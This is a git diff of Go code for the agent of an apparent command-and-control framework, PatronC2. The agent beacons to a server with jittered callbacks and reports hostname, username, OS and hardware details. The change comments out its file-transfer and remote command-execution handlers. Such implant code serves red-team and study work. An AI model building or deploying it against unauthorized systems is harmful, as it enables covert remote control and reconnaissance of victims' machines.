@@ -1,15 +1,11 @@
 package main
 
 import (
-	"crypto/tls"
-	"encoding/gob"
-	"fmt"
 	"log"
 	"time"
 
 	"github.com/PatronC2/Patron/client/client_utils"
 	"github.com/PatronC2/Patron/lib/logger"
-	"github.com/PatronC2/Patron/types"
 )
 
 var (
@@ -34,7 +30,7 @@ func main() {
 	osType, osArch, osVersion, cpus, memory := client_utils.GetOSInfo()
 
 	for {
-		beacon, encoder, decoder, err := client_utils.EstablishConnection(config, ServerIP, ServerPort)
+		beacon, err := client_utils.EstablishConnection(config, ServerIP, ServerPort)
 		if err != nil {
 			time.Sleep(5 * time.Second)
 			continue
@@ -43,20 +39,28 @@ func main() {
 
 		ip := client_utils.GetLocalIP(beacon)
 		nextCallback := client_utils.CalculateNextCallbackTime(CallbackFrequency, CallbackJitter)
-		if err := client_utils.HandleConfigurationRequest(beacon, encoder, decoder, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory, ServerIP, ServerPort, CallbackFrequency, CallbackJitter, nextCallback); err != nil {
+		err = client_utils.HandleConfigurationRequest(
+			beacon, agentID, hostname, username, ip,
+			osType, osArch, osVersion, cpus, memory,
+			ServerIP, ServerPort, CallbackFrequency, CallbackJitter,
+			nextCallback,
+		)
+		if err != nil {
 			client_utils.HandleError(beacon, "configuration", err)
 			continue
 		}
 
-		if err := client_utils.HandleFileRequest(beacon, encoder, decoder, agentID); err != nil {
-			client_utils.HandleError(beacon, "file", err)
-			continue
-		}
+		/*
+			if err := client_utils.HandleFileRequest(beacon, encoder, decoder, agentID); err != nil {
+				client_utils.HandleError(beacon, "file", err)
+				continue
+			}
 
-		if err := handleCommandRequest(beacon, encoder, decoder, agentID); err != nil {
-			client_utils.HandleError(beacon, "command", err)
-			continue
-		}
+			if err := handleCommandRequest(beacon, encoder, decoder, agentID); err != nil {
+				client_utils.HandleError(beacon, "command", err)
+				continue
+			}
+		*/
 
 		beacon.Close()
 		logger.Logf(logger.Info, "Beacon successful")
@@ -71,6 +75,7 @@ func main() {
 	}
 }
 
+/*
 func handleCommandRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
 	logger.Logf(logger.Info, "Fetching commands to run")
 
@@ -149,3 +154,4 @@ func executeCommandRequest(instruct *types.CommandResponse) types.CommandStatusR
 		CommandOutput: CmdOut,
 	}
 }
+*/
